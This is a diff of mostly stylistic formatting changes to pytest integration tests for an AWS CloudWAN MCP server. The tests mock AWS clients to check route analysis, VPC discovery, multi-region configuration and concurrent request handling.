 class TestPerformanceDatasetIntegration:
@@ -222,23 +220,23 @@
         assert len(routes) == 100000
 
         # Test route analysis with large dataset
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             # Use a subset for testing to avoid timeout
             test_routes = routes[:1000]  # First 1000 routes
             mock_client.search_transit_gateway_routes.return_value = {
-                'Routes': test_routes,
-                'AdditionalRoutesAvailable': False
+                "Routes": test_routes,
+                "AdditionalRoutesAvailable": False,
             }
             mock_get_client.return_value = mock_client
 
             start_time = time.time()
-            result = await analyze_tgw_routes('tgw-rtb-performance-test')
+            result = await analyze_tgw_routes("tgw-rtb-performance-test")
             processing_time = time.time() - start_time
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['analysis']['total_routes'] == 1000
+            assert parsed["success"] is True
+            assert parsed["analysis"]["total_routes"] == 1000
 
             # Should process efficiently
             assert processing_time < 5.0, f"Route processing took {processing_time:.2f}s"
@@ -253,11 +251,11 @@
         assert len(vpcs) == 10000
 
         # Test VPC discovery with large dataset
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             # Use a subset for testing
             test_vpcs = vpcs[:500]  # First 500 VPCs
-            mock_client.describe_vpcs.return_value = {'Vpcs': test_vpcs}
+            mock_client.describe_vpcs.return_value = {"Vpcs": test_vpcs}
             mock_get_client.return_value = mock_client
 
             start_time = time.time()
@@ -265,15 +263,15 @@
             processing_time = time.time() - start_time
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 500
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 500
 
             # Should discover efficiently
             assert processing_time < 3.0, f"VPC discovery took {processing_time:.2f}s"
 
             # Validate data integrity
-            assert all('VpcId' in vpc for vpc in parsed['vpcs'])
-            assert all(vpc['State'] == 'available' for vpc in parsed['vpcs'])
+            assert all("VpcId" in vpc for vpc in parsed["vpcs"])
+            assert all(vpc["State"] == "available" for vpc in parsed["vpcs"])
 
 
 class TestMultiRegionConfigurationIntegration:
@@ -285,25 +283,25 @@
         """Test global deployment configuration."""
         config = global_deployment_config
 
-        assert config['deployment_type'] == 'global'
-        assert config['primary_region'] == 'us-east-1'
-        assert len(config['secondary_regions']) == 3
+        assert config["deployment_type"] == "global"
+        assert config["primary_region"] == "us-east-1"
+        assert len(config["secondary_regions"]) == 3
 
         # Test each region configuration
-        for region_name, region_config in config['regions'].items():
-            assert region_config['region_name'] == region_name
-            assert len(region_config['availability_zones']) == 3
-            assert len(region_config['core_networks']) == 1
-            assert len(region_config['transit_gateways']) == 1
+        for region_name, region_config in config["regions"].items():
+            assert region_config["region_name"] == region_name
+            assert len(region_config["availability_zones"]) == 3
+            assert len(region_config["core_networks"]) == 1
+            assert len(region_config["transit_gateways"]) == 1
 
             # Primary region should have more VPCs
-            if region_config['is_primary']:
-                assert len(region_config['vpcs']) == 5
+            if region_config["is_primary"]:
+                assert len(region_config["vpcs"]) == 5
             else:
-                assert len(region_config['vpcs']) == 3
+                assert len(region_config["vpcs"]) == 3
 
         # Test cross-region connections
-        assert len(config['cross_region_connections']) == len(config['secondary_regions'])
+        assert len(config["cross_region_connections"]) == len(config["secondary_regions"])
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -311,26 +309,26 @@
         """Test disaster recovery configuration."""
         config = disaster_recovery_config
 
-        assert config['deployment_type'] == 'disaster_recovery'
-        assert config['primary_site']['region'] == 'us-east-1'
-        assert config['dr_site']['region'] == 'us-west-2'
+        assert config["deployment_type"] == "disaster_recovery"
+        assert config["primary_site"]["region"] == "us-east-1"
+        assert config["dr_site"]["region"] == "us-west-2"
 
         # Validate DR requirements
-        assert config['primary_site']['rto'] == 300  # 5 minutes
-        assert config['primary_site']['rpo'] == 900  # 15 minutes
-        assert config['dr_site']['rto'] == 600       # 10 minutes
+        assert config["primary_site"]["rto"] == 300  # 5 minutes
+        assert config["primary_site"]["rpo"] == 900  # 15 minutes
+        assert config["dr_site"]["rto"] == 600  # 10 minutes
 
         # Test replication configuration
-        assert config['replication']['method'] == 'async'
-        assert config['replication']['frequency'] == 300
+        assert config["replication"]["method"] == "async"
+        assert config["replication"]["frequency"] == 300
 
         # Validate resources for both sites
-        for site_name in ['primary_site', 'dr_site']:
+        for site_name in ["primary_site", "dr_site"]:
             site = config[site_name]
-            assert 'resources' in site
-            assert len(site['resources']['core_networks']) == 1
-            assert len(site['resources']['transit_gateways']) == 1
-            assert len(site['resources']['vpcs']) == 3  # One per AZ
+            assert "resources" in site
+            assert len(site["resources"]["core_networks"]) == 1
+            assert len(site["resources"]["transit_gateways"]) == 1
+            assert len(site["resources"]["vpcs"]) == 3  # One per AZ
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -340,32 +338,30 @@
 
         # Test that global resources are consistent across regions
         global_network_id = None
-        for region_name, region_config in config['regions'].items():
-            core_network = region_config['core_networks'][0]
+        for region_name, region_config in config["regions"].items():
+            core_network = region_config["core_networks"][0]
 
             if global_network_id is None:
-                global_network_id = core_network['GlobalNetworkId']
+                global_network_id = core_network["GlobalNetworkId"]
             else:
                 # All core networks should reference same global network
-                assert core_network['GlobalNetworkId'] == global_network_id
+                assert core_network["GlobalNetworkId"] == global_network_id
 
         # Test mock responses for consistency
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
 
-            for region_name, region_config in config['regions'].items():
+            for region_name, region_config in config["regions"].items():
                 # Mock core networks response
-                mock_client.list_core_networks.return_value = {
-                    'CoreNetworks': region_config['core_networks']
-                }
+                mock_client.list_core_networks.return_value = {"CoreNetworks": region_config["core_networks"]}
                 mock_get_client.return_value = mock_client
 
                 result = await list_core_networks(region=region_name)
                 parsed = json.loads(result)
 
-                assert parsed['success'] is True
-                assert parsed['region'] == region_name
-                assert len(parsed['core_networks']) == 1
+                assert parsed["success"] is True
+                assert parsed["region"] == region_name
+                assert len(parsed["core_networks"]) == 1
 
 
 class TestFixtureScalabilityValidation:
@@ -390,15 +386,15 @@
         policy = enterprise_policy
 
         # Validate complex structures
-        assert len(topology['regions']) == 5
-        assert len(topology['peering_connections']) == 4  # Chain connections
-        assert len(policy['segments']) == 10
-        assert len(policy['attachment-policies']) == 50
+        assert len(topology["regions"]) == 5
+        assert len(topology["peering_connections"]) == 4  # Chain connections
+        assert len(policy["segments"]) == 10
+        assert len(policy["attachment-policies"]) == 50
 
         # Test policy validation
         result = await validate_cloudwan_policy(policy)
         parsed = json.loads(result)
-        assert parsed['success'] is True
+        assert parsed["success"] is True
 
         # Measure memory after
         gc.collect()
@@ -416,28 +412,28 @@
         policy = security_policy
 
         # Validate topology data integrity
-        for region in topology['regions']:
+        for region in topology["regions"]:
             # Each region should have consistent data
-            assert region in topology['vpc_attachments']
-            assert region in topology['transit_gateways']
+            assert region in topology["vpc_attachments"]
+            assert region in topology["transit_gateways"]
 
-            vpcs = topology['vpc_attachments'][region]
+            vpcs = topology["vpc_attachments"][region]
             for vpc in vpcs:
-                assert vpc['Region'] == region
-                assert vpc['State'] == 'available'
-                assert 'VpcId' in vpc
-                assert 'CidrBlock' in vpc
+                assert vpc["Region"] == region
+                assert vpc["State"] == "available"
+                assert "VpcId" in vpc
+                assert "CidrBlock" in vpc
 
         # Validate policy data integrity
-        for segment in policy['segments']:
-            assert 'name' in segment
-            assert 'require-attachment-acceptance' in segment
-            assert 'isolate-attachments' in segment
-            if 'allow-filter' in segment:
+        for segment in policy["segments"]:
+            assert "name" in segment
+            assert "require-attachment-acceptance" in segment
+            assert "isolate-attachments" in segment
+            if "allow-filter" in segment:
                 # CIDR blocks should be valid format
-                for cidr in segment['allow-filter']:
-                    assert '/' in cidr
-                    parts = cidr.split('/')
+                for cidr in segment["allow-filter"]:
+                    assert "/" in cidr
+                    parts = cidr.split("/")
                     assert len(parts) == 2
                     assert parts[1].isdigit()
 
@@ -448,24 +444,24 @@
         topology = hierarchical_topology
 
         # Test hierarchy edge cases
-        root = topology['hierarchy']
+        root = topology["hierarchy"]
 
         def validate_hierarchy_node(node, expected_level):
-            assert node['level'] == expected_level
-            assert len(node['vpcs']) > 0  # Every node should have VPCs
+            assert node["level"] == expected_level
+            assert len(node["vpcs"]) > 0  # Every node should have VPCs
 
             # Test parent-child relationships
-            for child in node['children']:
-                assert child['parent_id'] == node['node_id']
-                assert child['level'] == expected_level + 1
+            for child in node["children"]:
+                assert child["parent_id"] == node["node_id"]
+                assert child["level"] == expected_level + 1
                 validate_hierarchy_node(child, expected_level + 1)
 
         validate_hierarchy_node(root, 1)
 
         # Test that all core networks have valid IDs
-        for core_network in topology['core_networks']:
-            assert 'CoreNetworkId' in core_network
-            assert core_network['CoreNetworkId'].startswith('core-network-')
-            assert core_network['State'] == 'AVAILABLE'
-            assert 'Level' in core_network
-            assert 1 <= core_network['Level'] <= topology['levels']
+        for core_network in topology["core_networks"]:
+            assert "CoreNetworkId" in core_network
+            assert core_network["CoreNetworkId"].startswith("core-network-")
+            assert core_network["State"] == "AVAILABLE"
+            assert "Level" in core_network
+            assert 1 <= core_network["Level"] <= topology["levels"]

--- cloudwan-mcp-server/tests/integration/test_comprehensive_server.py
+++ cloudwan-mcp-server/tests/integration/test_comprehensive_server.py
@@ -42,23 +42,23 @@
         assert isinstance(mcp, FastMCP)
 
         # Verify server name contains CloudWAN identifier
-        server_name = getattr(mcp, 'name', '') or getattr(mcp, '_name', '')
+        server_name = getattr(mcp, "name", "") or getattr(mcp, "_name", "")
         assert "CloudWAN" in server_name or "cloudwan" in server_name.lower()
 
         # Verify server has tools or can be identified as MCP server
-        assert hasattr(mcp, 'tools') or hasattr(mcp, '_tools') or isinstance(mcp, FastMCP)
+        assert hasattr(mcp, "tools") or hasattr(mcp, "_tools") or isinstance(mcp, FastMCP)
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_all_core_tools_registered(self):
         """Test that all core CloudWAN tools are registered properly."""
         expected_core_tools = {
-            'trace_network_path',
-            'list_core_networks',
-            'get_global_networks',
-            'discover_vpcs',
-            'validate_ip_cidr',
-            'get_core_network_policy'
+            "trace_network_path",
+            "list_core_networks",
+            "get_global_networks",
+            "discover_vpcs",
+            "validate_ip_cidr",
+            "get_core_network_policy",
         }
 
         # Get registered tool names from list_tools()
@@ -66,17 +66,22 @@
         registered_tools = {tool.name for tool in tools}
 
         # Verify core tools are registered
-        assert len(registered_tools.intersection(expected_core_tools)) >= 4, \
+        assert len(registered_tools.intersection(expected_core_tools)) >= 4, (
             f"Expected at least 4 core tools, found {len(registered_tools)}"
-        assert 'list_core_networks' in registered_tools, "list_core_networks must be registered"
+        )
+        assert "list_core_networks" in registered_tools, "list_core_networks must be registered"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_tool_function_async_compatibility(self):
         """Test that all tool functions are async-compatible following AWS Labs patterns."""
         core_functions = [
-            list_core_networks, get_global_networks, get_core_network_policy,
-            trace_network_path, discover_vpcs, validate_ip_cidr
+            list_core_networks,
+            get_global_networks,
+            get_core_network_policy,
+            trace_network_path,
+            discover_vpcs,
+            validate_ip_cidr,
         ]
 
         for func in core_functions:
@@ -87,9 +92,9 @@
     @pytest.mark.asyncio
     async def test_aws_client_integration_success(self, mock_aws_context):
         """Test AWS client integration with successful configuration."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.list_core_networks.return_value = {'CoreNetworks': []}
+            mock_client.list_core_networks.return_value = {"CoreNetworks": []}
             mock_get_client.return_value = mock_client
 
             result = await list_core_networks()
@@ -99,15 +104,16 @@
 
             # Parse JSON and verify AWS Labs standard response format
             import json
+
             parsed = json.loads(result)
             assert isinstance(parsed, dict)
-            assert 'success' in parsed
+            assert "success" in parsed
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_aws_client_credential_error_handling(self, mock_aws_context):
         """Test AWS client error handling for missing credentials."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_get_client.side_effect = NoCredentialsError()
 
             result = await list_core_networks()
@@ -117,20 +123,20 @@
 
             # Parse JSON and verify error handling follows AWS Labs patterns
             import json
+
             parsed = json.loads(result)
             assert isinstance(parsed, dict)
             # Should return error response, not raise exception
-            assert 'error' in parsed or 'success' in parsed
+            assert "error" in parsed or "success" in parsed
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_aws_service_error_handling(self, mock_aws_context):
         """Test AWS service error handling following AWS Labs patterns."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.list_core_networks.side_effect = ClientError(
-                {'Error': {'Code': 'AccessDenied', 'Message': 'Access denied'}},
-                'ListCoreNetworks'
+                {"Error": {"Code": "AccessDenied", "Message": "Access denied"}}, "ListCoreNetworks"
             )
             mock_get_client.return_value = mock_client
 
@@ -141,24 +147,25 @@
 
             # Parse JSON and verify AWS Labs error response format
             import json
+
             parsed = json.loads(result)
             assert isinstance(parsed, dict)
-            assert 'error' in parsed or 'success' in parsed
+            assert "error" in parsed or "success" in parsed
 
     @pytest.mark.integration
     def test_environment_variable_configuration(self):
         """Test server handles environment variables correctly."""
         # Test AWS_DEFAULT_REGION is accessible
-        original_region = os.environ.get('AWS_DEFAULT_REGION')
+        original_region = os.environ.get("AWS_DEFAULT_REGION")
 
         try:
             # Test with valid region
-            os.environ['AWS_DEFAULT_REGION'] = 'us-east-1'
+            os.environ["AWS_DEFAULT_REGION"] = "us-east-1"
             from awslabs.cloudwan_mcp_server.server import get_aws_client
 
             # Should not raise exception with valid region
             try:
-                client = get_aws_client('networkmanager')
+                client = get_aws_client("networkmanager")
                 assert client is not None
             except Exception:
                 # Some errors are expected if no credentials, but should not be region-related
@@ -167,15 +174,15 @@
         finally:
             # Restore original environment
             if original_region:
-                os.environ['AWS_DEFAULT_REGION'] = original_region
+                os.environ["AWS_DEFAULT_REGION"] = original_region
             else:
-                os.environ.pop('AWS_DEFAULT_REGION', None)
+                os.environ.pop("AWS_DEFAULT_REGION", None)
 
     @pytest.mark.integration
-    @patch('awslabs.cloudwan_mcp_server.server.mcp.run')
+    @patch("awslabs.cloudwan_mcp_server.server.mcp.run")
     def test_main_function_with_valid_environment(self, mock_run):
         """Test main function with valid environment configuration."""
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
             try:
                 main()
                 # If main() completes without exception, test passes
@@ -194,29 +201,29 @@
 
         # Test ContentItem structure
         content_item = ContentItem(type="text", text="test content")
-        assert content_item['type'] == "text"
-        assert content_item['text'] == "test content"
+        assert content_item["type"] == "text"
+        assert content_item["text"] == "test content"
 
         # Test McpResponse structure
         response = McpResponse(content=[content_item])
-        assert 'content' in response
-        assert len(response['content']) == 1
+        assert "content" in response
+        assert len(response["content"]) == 1
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_concurrent_tool_execution(self, mock_aws_context):
         """Test concurrent tool execution following AWS Labs patterns."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.list_core_networks.return_value = {'CoreNetworks': []}
-            mock_client.describe_global_networks.return_value = {'GlobalNetworks': []}
+            mock_client.list_core_networks.return_value = {"CoreNetworks": []}
+            mock_client.describe_global_networks.return_value = {"GlobalNetworks": []}
             mock_get_client.return_value = mock_client
 
             # Test concurrent execution of multiple tools
             tasks = [
                 list_core_networks(),
                 get_global_networks(),
-                list_core_networks()  # Duplicate to test caching/concurrency
+                list_core_networks(),  # Duplicate to test caching/concurrency
             ]
 
             results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -228,6 +235,7 @@
 
                 # Parse JSON to verify structure
                 import json
+
                 parsed = json.loads(result)
                 assert isinstance(parsed, dict), f"Task {i} JSON is not a dict: {type(parsed)}"
 
@@ -237,13 +245,16 @@
         from awslabs.cloudwan_mcp_server import server
 
         # Verify server module has required attributes
-        assert hasattr(server, 'mcp'), "Server must have mcp attribute"
-        assert hasattr(server, 'main'), "Server must have main function"
+        assert hasattr(server, "mcp"), "Server must have mcp attribute"
+        assert hasattr(server, "main"), "Server must have main function"
 
         # Verify server has tool functions
         tool_functions = [
-            'list_core_networks', 'get_global_networks', 'trace_network_path',
-            'discover_vpcs', 'validate_ip_cidr'
+            "list_core_networks",
+            "get_global_networks",
+            "trace_network_path",
+            "discover_vpcs",
+            "validate_ip_cidr",
         ]
 
         available_tools = []
@@ -263,6 +274,7 @@
 
         # Parse JSON to verify structure
         import json
+
         parsed = json.loads(result)
         assert isinstance(parsed, dict)
 
@@ -280,10 +292,11 @@
         from awslabs.cloudwan_mcp_server.server import mcp
 
         # Verify server has appropriate name/description
-        assert hasattr(mcp, 'name'), "Server must have name attribute"
+        assert hasattr(mcp, "name"), "Server must have name attribute"
         server_name = mcp.name.lower()
-        assert any(keyword in server_name for keyword in ['cloudwan', 'aws', 'network']), \
+        assert any(keyword in server_name for keyword in ["cloudwan", "aws", "network"]), (
             f"Server name '{mcp.name}' should contain CloudWAN/AWS/Network identifier"
+        )
 
         # Test server is properly initialized for MCP protocol
         assert isinstance(mcp, FastMCP), "Server must be FastMCP instance"

--- cloudwan-mcp-server/tests/integration/test_concurrent_handling.py
+++ cloudwan-mcp-server/tests/integration/test_concurrent_handling.py
@@ -61,13 +61,13 @@
 
                 # Return mock core networks
                 return {
-                    'CoreNetworks': [
+                    "CoreNetworks": [
                         {
-                            'CoreNetworkId': f'core-network-concurrent-{current_request:06d}',
-                            'GlobalNetworkId': f'global-network-{current_request:06d}',
-                            'State': 'AVAILABLE',
-                            'Description': f'Concurrent test network {current_request}',
-                            'CreatedAt': datetime.now(timezone.utc)
+                            "CoreNetworkId": f"core-network-concurrent-{current_request:06d}",
+                            "GlobalNetworkId": f"global-network-{current_request:06d}",
+                            "State": "AVAILABLE",
+                            "Description": f"Concurrent test network {current_request}",
+                            "CreatedAt": datetime.now(timezone.utc),
                         }
                     ]
                 }
@@ -75,39 +75,39 @@
             mock_client.list_core_networks.side_effect = concurrent_list_networks
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=mock_client_factory):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=mock_client_factory):
             # Create concurrent tasks
             start_time = time.time()
 
             async def single_request(request_id):
                 request_start = time.time()
                 try:
-                    result = await list_core_networks(region=f'us-east-{(request_id % 2) + 1}')
+                    result = await list_core_networks(region=f"us-east-{(request_id % 2) + 1}")
                     request_end = time.time()
                     response_time = request_end - request_start
 
                     parsed = json.loads(result)
-                    if parsed['success']:
+                    if parsed["success"]:
                         return {
-                            'request_id': request_id,
-                            'success': True,
-                            'response_time': response_time,
-                            'total_count': parsed['total_count']
+                            "request_id": request_id,
+                            "success": True,
+                            "response_time": response_time,
+                            "total_count": parsed["total_count"],
                         }
                     else:
                         return {
-                            'request_id': request_id,
-                            'success': False,
-                            'response_time': response_time,
-                            'error': parsed.get('error', 'Unknown error')
+                            "request_id": request_id,
+                            "success": False,
+                            "response_time": response_time,
+                            "error": parsed.get("error", "Unknown error"),
                         }
                 except Exception as e:
                     request_end = time.time()
                     return {
-                        'request_id': request_id,
-                        'success': False,
-                        'response_time': request_end - request_start,
-                        'error': str(e)
+                        "request_id": request_id,
+                        "success": False,
+                        "response_time": request_end - request_start,
+                        "error": str(e),
                     }
 
             # Execute concurrent requests
@@ -120,8 +120,8 @@
             # Analyze results
             for result in results:
                 if isinstance(result, dict):
-                    response_times.append(result['response_time'])
-                    if result['success']:
+                    response_times.append(result["response_time"])
+                    if result["success"]:
                         successful_requests += 1
                     else:
                         failed_requests += 1
@@ -141,8 +141,10 @@
             assert max_response_time < 2.0, f"Max response time {max_response_time:.3f}s too high"
 
             requests_per_second = concurrent_requests / total_execution_time
-            print(f"Concurrent performance: {requests_per_second:.1f} req/s, "
-                  f"avg {avg_response_time:.3f}s, max {max_response_time:.3f}s")
+            print(
+                f"Concurrent performance: {requests_per_second:.1f} req/s, "
+                f"avg {avg_response_time:.3f}s, max {max_response_time:.3f}s"
+            )
 
     @pytest.mark.integration
     @pytest.mark.slow
@@ -151,61 +153,59 @@
         """Test concurrent requests across different operation types."""
         operations_per_type = 100
         operation_results = {
-            'list_core_networks': [],
-            'get_global_networks': [],
-            'discover_vpcs': [],
-            'validate_ip_cidr': []
+            "list_core_networks": [],
+            "get_global_networks": [],
+            "discover_vpcs": [],
+            "validate_ip_cidr": [],
         }
 
         def mock_client_factory(service, region=None):
             mock_client = Mock()
 
             # Mock responses for different services
-            if service == 'networkmanager':
+            if service == "networkmanager":
                 mock_client.list_core_networks.return_value = {
-                    'CoreNetworks': [{'CoreNetworkId': 'core-network-mixed-test'}]
+                    "CoreNetworks": [{"CoreNetworkId": "core-network-mixed-test"}]
                 }
                 mock_client.describe_global_networks.return_value = {
-                    'GlobalNetworks': [{'GlobalNetworkId': 'global-network-mixed-test'}]
-                }
-            elif service == 'ec2':
-                mock_client.describe_vpcs.return_value = {
-                    'Vpcs': [{'VpcId': 'vpc-mixed-test', 'State': 'available'}]
+                    "GlobalNetworks": [{"GlobalNetworkId": "global-network-mixed-test"}]
                 }
+            elif service == "ec2":
+                mock_client.describe_vpcs.return_value = {"Vpcs": [{"VpcId": "vpc-mixed-test", "State": "available"}]}
 
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=mock_client_factory):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=mock_client_factory):
 
             async def concurrent_operation(op_type, request_id):
                 start_time = time.time()
                 try:
-                    if op_type == 'list_core_networks':
+                    if op_type == "list_core_networks":
                         result = await list_core_networks()
-                    elif op_type == 'get_global_networks':
+                    elif op_type == "get_global_networks":
                         result = await get_global_networks()
-                    elif op_type == 'discover_vpcs':
+                    elif op_type == "discover_vpcs":
                         result = await discover_vpcs()
-                    elif op_type == 'validate_ip_cidr':
-                        result = await validate_ip_cidr('validate_ip', ip=f'10.0.{request_id % 256}.1')
+                    elif op_type == "validate_ip_cidr":
+                        result = await validate_ip_cidr("validate_ip", ip=f"10.0.{request_id % 256}.1")
 
                     end_time = time.time()
                     parsed = json.loads(result)
 
                     return {
-                        'operation': op_type,
-                        'request_id': request_id,
-                        'success': parsed['success'],
-                        'response_time': end_time - start_time
+                        "operation": op_type,
+                        "request_id": request_id,
+                        "success": parsed["success"],
+                        "response_time": end_time - start_time,
                     }
                 except Exception as e:
                     end_time = time.time()
                     return {
-                        'operation': op_type,
-                        'request_id': request_id,
-                        'success': False,
-                        'response_time': end_time - start_time,
-                        'error': str(e)
+                        "operation": op_type,
+                        "request_id": request_id,
+                        "success": False,
+                        "response_time": end_time - start_time,
+                        "error": str(e),
                     }
 
             # Create mixed concurrent tasks
@@ -225,15 +225,17 @@
             # Organize results by operation type
             for result in results:
                 if isinstance(result, dict):
-                    op_type = result['operation']
+                    op_type = result["operation"]
                     operation_results[op_type].append(result)
 
             # Analyze results per operation type
             for op_type, results_list in operation_results.items():
-                successful = sum(1 for r in results_list if r['success'])
-                avg_time = sum(r['response_time'] for r in results_list) / len(results_list)
+                successful = sum(1 for r in results_list if r["success"])
+                avg_time = sum(r["response_time"] for r in results_list) / len(results_list)
 
-                assert successful >= operations_per_type * 0.95, f"{op_type}: only {successful}/{operations_per_type} successful"
+                assert successful >= operations_per_type * 0.95, (
+                    f"{op_type}: only {successful}/{operations_per_type} successful"
+                )
                 assert avg_time < 1.0, f"{op_type}: average response time {avg_time:.3f}s too high"
 
             # Overall performance
@@ -261,8 +263,8 @@
                     time.sleep(0.01)  # Wait for connection to be available
                     if time.time() - wait_start > 5.0:  # 5s timeout
                         raise ClientError(
-                            {'Error': {'Code': 'ConnectionPoolTimeout', 'Message': 'Connection pool exhausted'}},
-                            'Operation'
+                            {"Error": {"Code": "ConnectionPoolTimeout", "Message": "Connection pool exhausted"}},
+                            "Operation",
                         )
 
                 wait_time = time.time() - wait_start
@@ -276,7 +278,7 @@
                     processing_time = 0.05 + (active_connections * 0.001)  # Longer with more connections
                     time.sleep(processing_time)
 
-                    return {'CoreNetworks': [{'CoreNetworkId': 'conn-pool-test'}]}
+                    return {"CoreNetworks": [{"CoreNetworkId": "conn-pool-test"}]}
                 finally:
                     # Release connection
                     active_connections -= 1
@@ -284,8 +286,7 @@
             mock_client.list_core_networks.side_effect = connection_limited_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=mock_client_with_connection_limit):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=mock_client_with_connection_limit):
             # Test with requests exceeding connection pool
             high_concurrency = 200  # More than max_connections
 
@@ -293,9 +294,9 @@
                 try:
                     result = await list_core_networks()
                     parsed = json.loads(result)
-                    return {'success': parsed['success'], 'request_id': request_id}
+                    return {"success": parsed["success"], "request_id": request_id}
                 except Exception as e:
-                    return {'success': False, 'request_id': request_id, 'error': str(e)}
+                    return {"success": False, "request_id": request_id, "error": str(e)}
 
             tasks = [pool_limited_request(i) for i in range(high_concurrency)]
 
@@ -304,10 +305,12 @@
             end_time = time.time()
 
             execution_time = end_time - start_time
-            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get('success', False))
+            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get("success", False))
 
             # Should handle connection pool limits gracefully
-            assert successful_requests >= high_concurrency * 0.8, f"Connection pool handling: {successful_requests}/{high_concurrency}"
+            assert successful_requests >= high_concurrency * 0.8, (
+                f"Connection pool handling: {successful_requests}/{high_concurrency}"
+            )
             assert execution_time < 120.0, f"Connection pool test took {execution_time:.2f}s"
 
             # Analyze connection wait times
@@ -358,11 +361,11 @@
                     time.sleep(work_duration)
 
                     return {
-                        'Routes': [
+                        "Routes": [
                             {
-                                'DestinationCidrBlock': f'10.{active_threads}.0.0/16',
-                                'State': 'active',
-                                'ThreadId': thread_id
+                                "DestinationCidrBlock": f"10.{active_threads}.0.0/16",
+                                "State": "active",
+                                "ThreadId": thread_id,
                             }
                         ]
                     }
@@ -372,26 +375,21 @@
             mock_client.search_transit_gateway_routes.side_effect = thread_limited_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=thread_limited_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=thread_limited_mock):
             # Test with more requests than available threads
             concurrent_requests = 100
 
             async def thread_limited_request(request_id):
                 try:
-                    result = await analyze_tgw_routes(f'tgw-rtb-thread-test-{request_id:03d}')
+                    result = await analyze_tgw_routes(f"tgw-rtb-thread-test-{request_id:03d}")
                     parsed = json.loads(result)
                     return {
-                        'success': parsed['success'],
-                        'request_id': request_id,
-                        'total_routes': parsed.get('analysis', {}).get('total_routes', 0)
+                        "success": parsed["success"],
+                        "request_id": request_id,
+                        "total_routes": parsed.get("analysis", {}).get("total_routes", 0),
                     }
                 except Exception as e:
-                    return {
-                        'success': False,
-                        'request_id': request_id,
-                        'error': str(e)
-                    }
+                    return {"success": False, "request_id": request_id, "error": str(e)}
 
             tasks = [thread_limited_request(i) for i in range(concurrent_requests)]
 
@@ -400,10 +398,12 @@
             end_time = time.time()
 
             execution_time = end_time - start_time
-            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get('success', False))
+            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get("success", False))
 
             # Thread pool should handle saturation gracefully
-            assert successful_requests >= concurrent_requests * 0.9, f"Thread saturation: {successful_requests}/{concurrent_requests}"
+            assert successful_requests >= concurrent_requests * 0.9, (
+                f"Thread saturation: {successful_requests}/{concurrent_requests}"
+            )
             assert execution_time < 180.0, f"Thread saturation test took {execution_time:.2f}s"
 
             # Analyze thread queue behavior
@@ -423,10 +423,11 @@
 
         # Original function reference
         from awslabs.cloudwan_mcp_server.server import analyze_tgw_routes
+
         original_analyze_tgw_routes = analyze_tgw_routes
 
         # Create cancellation-aware wrapper
-        async def cancellation_aware_analyze_tgw_routes(route_table_id: str, region = None):
+        async def cancellation_aware_analyze_tgw_routes(route_table_id: str, region=None):
             """Cancellation-aware wrapper for analyze_tgw_routes with explicit cancellation points."""
             nonlocal completed_tasks
 
@@ -443,6 +444,7 @@
 
                 # Return successful result
                 import json
+
                 result = {
                     "success": True,
                     "route_table_id": route_table_id,
@@ -455,31 +457,27 @@
                             {
                                 "DestinationCidrBlock": f"10.{completed_tasks}.0.0/16",
                                 "State": "active",
-                                "Type": "static"
+                                "Type": "static",
                             }
-                        ]
-                    }
+                        ],
+                    },
                 }
                 return json.dumps(result, indent=2, default=str)
 
             except asyncio.CancelledError:
                 # Task was cancelled - record this scenario
-                cancellation_scenarios.append({
-                    'operation_id': route_table_id,
-                    'cancelled_at': time.time(),
-                    'cleanup_completed': True
-                })
+                cancellation_scenarios.append(
+                    {"operation_id": route_table_id, "cancelled_at": time.time(), "cleanup_completed": True}
+                )
                 # Re-raise to maintain proper asyncio cancellation behavior
                 raise
 
         # Patch the function to use our cancellation-aware version
